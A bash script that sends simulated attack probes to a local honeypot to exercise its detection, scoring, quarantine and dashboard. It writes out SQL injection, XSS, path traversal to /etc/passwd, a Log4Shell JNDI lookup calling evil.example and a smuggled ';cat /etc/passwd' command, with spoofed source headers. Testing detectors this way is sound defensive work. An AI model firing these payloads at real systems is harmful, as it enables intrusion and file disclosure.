#!/usr/bin/env bash
# Fire a batch of representative probes at the honeypot so the detection
# engine, threat scoring, and Grafana dashboard light up. For LAB/DEMO use
# against your own local stack only.
set -uo pipefail

TARGET="${1:-http://localhost:5000}"
echo "==> Simulating attacks against ${TARGET}"

probe() { curl -s -o /dev/null -w "  [%{http_code}] $1 $2\n" -X "$1" "${TARGET}${2}" "${@:3}"; }

# Recon / scanners (spoofed source via X-Forwarded-For so each looks distinct)
probe GET "/.env"                         -H 'X-Forwarded-For: 203.0.113.10'
probe GET "/.git/config"                  -H 'X-Forwarded-For: 203.0.113.10'
probe GET "/wp-login.php"                 -H 'User-Agent: sqlmap/1.7'      -H 'X-Forwarded-For: 198.51.100.7'
probe GET "/phpmyadmin/"                  -H 'User-Agent: Nikto/2.1.6'     -H 'X-Forwarded-For: 198.51.100.7'

# Injection attempts
probe GET "/search?id=1%27%20OR%201=1--"                                   -H 'X-Forwarded-For: 192.0.2.55'
probe GET "/item?q=%3Cscript%3Ealert(1)%3C/script%3E"                      -H 'X-Forwarded-For: 192.0.2.55'
probe GET "/download?file=../../../../etc/passwd"                          -H 'X-Forwarded-For: 192.0.2.99'
probe GET "/api?x=%24%7Bjndi:ldap://evil.example/a%7D"                     -H 'X-Forwarded-For: 192.0.2.99'
probe POST "/run" -H 'Content-Type: application/json' \
      -d '{"cmd":";cat /etc/passwd"}'                                      -H 'X-Forwarded-For: 192.0.2.99'

# Hammer one source hard enough to trip quarantine, then confirm the tarpit.
echo "==> Flooding 10.10.10.10 to trigger quarantine"
for _ in 1 2 3 4; do
  curl -s -o /dev/null "${TARGET}/x?id=1%27%20OR%201=1--%20UNION%20SELECT" \
    -H 'X-Forwarded-For: 10.10.10.10'
done
probe GET "/.env" -H 'X-Forwarded-For: 10.10.10.10'   # expect 403 (quarantined)

echo "==> Done. Check the live picture:"
echo "    curl -s ${TARGET}/honeypot/stats | python -m json.tool"
echo "    Grafana:    http://localhost:3000  (dashboard: Honeypot — Live Threat Activity)"
